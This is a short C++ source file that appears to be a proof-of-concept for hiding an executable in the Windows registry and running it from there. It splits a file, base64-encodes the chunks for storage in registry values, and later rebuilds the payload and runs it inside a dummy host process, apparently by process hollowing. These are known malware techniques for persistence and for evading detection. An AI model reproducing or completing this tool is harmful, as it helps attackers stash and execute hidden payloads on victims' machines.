#include "base64.h"
#include "registry.h"
#include "filereader.h"
#include "process.h"

#include <string>

void WriteFileToRegistry(const char * const pFilePath)
{
    HKEY hKey = OpenRegistryKey("RegistryTest");

    std::string strSubName = "Part";
    std::string strSizeName = "Size";
    size_t ulIndex = 1;
 
    auto splitFile = SplitFile(pFilePath);
    for (size_t i = 0; i < splitFile.size(); ++i)
    {
        std::string strFullName(strSubName + std::to_string(ulIndex));
		std::cout << base64_encode(splitFile[i].data(), READ_WRITE_SIZE) << std::endl;
        //WriteRegistryKeyString(hKey, strFullName.c_str(), splitFile[i].data(), READ_WRITE_SIZE);
        ++ulIndex;
    }

    CloseHandle(hKey);
}

void ExecuteFileFromRegistry(const char * const pValueName)
{
    HKEY hKey = OpenRegistryKey("RegistryTest");

    auto newProcessInfo = JoinRegistryToFile("RegistryTest", pValueName);
    auto processInfo = MapTargetProcess(newProcessInfo, "DummyProcess.exe");
    RunTargetProcess(newProcessInfo, processInfo);

    CloseHandle(hKey);
}

int main(int argc, char *argv[])
{

    if (argc != 3)
    {
        fprintf(stderr, "Usage: \n"
            "%s w \"<path of process to write to registry>\"\n"
            "%s e \"<name of subkey of process>\"\n",
            argv[0], argv[0]);
        exit(-1);
    }

    switch (*argv[1])
    {
        case 'w':
            WriteFileToRegistry(argv[2]);
            break;

        case 'e':
            ExecuteFileFromRegistry(argv[2]);
            break;

        default:
            fprintf(stderr, "Unrecognized option. Must be w or e.\n");
            exit(-1);
    }
    
    return 0;
}